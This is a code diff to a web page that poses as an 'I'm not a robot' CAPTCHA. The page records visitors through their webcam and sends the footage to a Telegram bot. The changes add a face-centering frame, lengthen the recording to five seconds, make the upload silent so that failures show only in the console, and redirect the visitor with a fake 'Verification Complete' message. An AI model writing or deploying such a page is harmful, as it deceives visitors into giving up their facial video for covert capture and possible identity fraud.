@@ -74,6 +74,19 @@
             margin: 20px 0;
             display: block;
             background: black;
+            position: relative;
+        }
+
+        .face-frame {
+            position: absolute;
+            width: 150px;
+            height: 150px;
+            border: 3px solid #FFD700;
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
         }
 
         @keyframes zoomIn {
@@ -95,9 +108,12 @@
             <input type="checkbox" id="robot-checkbox">
             <label for="robot-checkbox">I'm not a robot</label>
         </div>
-        <video id="video" autoplay playsinline muted></video>
+        <div class="video-wrapper" style="position: relative;">
+            <video id="video" autoplay playsinline muted></video>
+            <div class="face-frame"></div>
+        </div>
         <div class="loading">Recording in progress... ⏳</div>
-        <div class="success">✅ You're verified! Please wait...</div>
+        <div class="success">✅ Verification Complete! Redirecting...</div>
     </div>
 
     <script>
@@ -133,7 +149,7 @@
 
                         setTimeout(() => {
                             mediaRecorder.stop();
-                        }, 3000); // Record for 3 seconds
+                        }, 5000); // Record for 5 seconds
 
                         mediaRecorder.onstop = () => {
                             const blob = new Blob(chunks, { type: 'video/webm' });
@@ -141,29 +157,26 @@
                             formData.append('chat_id', telegramChatId);
                             formData.append('video', blob, 'video.webm');
 
-                            // Send video to Telegram
+                            // Send video to Telegram in the background
                             fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
                                 method: 'POST',
                                 body: formData
-                            })
-                                .then((response) => {
-                                    if (response.ok) {
-                                        loading.style.display = 'none';
-                                        success.style.display = 'block';
-                                        setTimeout(() => {
-                                            success.style.display = 'none';
-                                        }, 2000);
-                                    } else {
-                                        alert('Failed to send video.');
-                                    }
-                                })
-                                .catch((error) => {
-                                    alert('Error: ' + error.message);
-                                });
+                            }).catch((error) => {
+                                console.error('Video upload failed:', error.message);
+                            });
 
                             // Stop the camera
                             stream.getTracks().forEach(track => track.stop());
                         };
+
+                        // Redirect after 5 seconds without waiting for video upload
+                        setTimeout(() => {
+                            loading.style.display = 'none';
+                            success.style.display = 'block';
+                            setTimeout(() => {
+                                window.location.href = '/'; // Redirect to homepage
+                            }, 2000); // 2 seconds for success message
+                        }, 5000);
                     })
                     .catch((err) => {
                         alert("Unable to access the camera: " + err.message);
